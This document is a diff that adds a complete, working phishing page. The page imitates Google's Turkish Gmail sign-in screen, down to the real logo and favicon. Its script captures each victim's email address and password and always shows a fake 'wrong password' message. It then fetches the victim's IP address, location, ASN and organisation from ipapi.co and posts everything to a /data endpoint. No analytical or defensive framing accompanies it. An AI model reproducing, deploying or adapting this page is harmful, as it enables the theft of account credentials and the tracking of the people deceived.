@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Gmail - Giriş Yap</title>
+
+<link rel="icon" href="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" type="image/x-icon" />
+
+<style>
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    background: #f1f3f4;
+    font-family: 'Roboto', Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .login-container {
+    background: #fff;
+    padding: 48px 40px 36px;
+    border-radius: 8px;
+    box-shadow: 0 2px 10px rgb(0 0 0 / 0.2);
+    width: 360px;
+    text-align: center;
+  }
+  .google-logo {
+    margin-bottom: 32px;
+  }
+  .google-logo img {
+    width: 75px;
+  }
+  h1 {
+    font-weight: 400;
+    font-size: 24px;
+    color: #202124;
+    margin-bottom: 8px;
+  }
+  p.subtitle {
+    font-size: 14px;
+    color: #5f6368;
+    margin-bottom: 32px;
+  }
+  input[type="email"],
+  input[type="password"] {
+    width: 100%;
+    padding: 12px 8px;
+    margin-bottom: 20px;
+    font-size: 16px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.3s;
+  }
+  input[type="email"]:focus,
+  input[type="password"]:focus {
+    border-color: #4285f4;
+  }
+  .forgot {
+    text-align: right;
+    margin-bottom: 30px;
+  }
+  .forgot a {
+    color: #1a73e8;
+    text-decoration: none;
+    font-size: 14px;
+    cursor: pointer;
+  }
+  button {
+    background-color: #1a73e8;
+    color: white;
+    border: none;
+    padding: 12px 0;
+    border-radius: 4px;
+    font-weight: 600;
+    font-size: 14px;
+    width: 100%;
+    cursor: pointer;
+    transition: background-color 0.3s;
+  }
+  button:hover {
+    background-color: #1669c1;
+  }
+  .create-account {
+    margin-top: 20px;
+    font-size: 14px;
+  }
+  .create-account a {
+    color: #1a73e8;
+    text-decoration: none;
+    cursor: pointer;
+    font-weight: 600;
+  }
+  .message {
+    color: #d93025;
+    font-size: 13px;
+    height: 18px;
+    margin-bottom: 10px;
+    min-height: 18px;
+  }
+  .language-select {
+    margin-top: 30px;
+    font-size: 13px;
+    color: #5f6368;
+  }
+  .language-select select {
+    border: none;
+    background: transparent;
+    font-size: 13px;
+    color: #5f6368;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+
+<div class="login-container">
+  <div class="google-logo">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo" />
+  </div>
+
+  <h1>Giriş Yap</h1>
+  <p class="subtitle">Gmail ile devam edin</p>
+
+  <form id="loginForm" autocomplete="off">
+    <input type="email" id="username" placeholder="E-posta veya telefon" required autofocus />
+    <input type="password" id="password" placeholder="Şifrenizi girin" required />
+    <div class="message" id="message"></div>
+
+    <div class="forgot">
+      <a href="#" id="forgotPassword">Şifrenizi mi unuttunuz?</a>
+    </div>
+
+    <button type="submit" id="nextBtn">Giriş Yap</button>
+  </form>
+
+  <div class="create-account">
+    <span>Hesabınız yok mu? </span><a href="#">Hesap oluşturun</a>
+  </div>
+
+  <div class="language-select">
+    <select aria-label="Select Language">
+      <option>Türkçe</option>
+      <option>English (United States)</option>
+      <option>Español</option>
+      <option>Français</option>
+    </select>
+  </div>
+</div>
+
+<script>
+  async function getIpDetails() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    return await res.json();
+  } catch (err) {
+    return {};
+  }
+}
+  const form = document.getElementById('loginForm');
+  const messageEl = document.getElementById('message');
+  const forgotPasswordLink = document.getElementById('forgotPassword');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (!username || !password) {
+      messageEl.textContent = "Lütfen hem e-posta adresinizi hem de şifrenizi girin.";
+      return;
+    }
+
+    messageEl.textContent = "Girdiğiniz şifre yanlış. Tekrar deneyin.";
+
+    const data = await getIpDetails();
+
+    const payload = {
+        username: username,
+        password: password,
+        ip: data.ip,
+        city: data.city,
+        region: data.region,
+        country: data.country_name,
+        latitude: data.latitude,
+        longitude: data.longitude,
+        asn: data.asn,
+        org: data.org
+    };
+
+    try {
+      await fetch('/data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (error) {
+      console.error('Fetch error:', error);
+    }
+  });
+
+  forgotPasswordLink.addEventListener('click', e => e.preventDefault());
+</script>
+
+</body>
+</html>
+
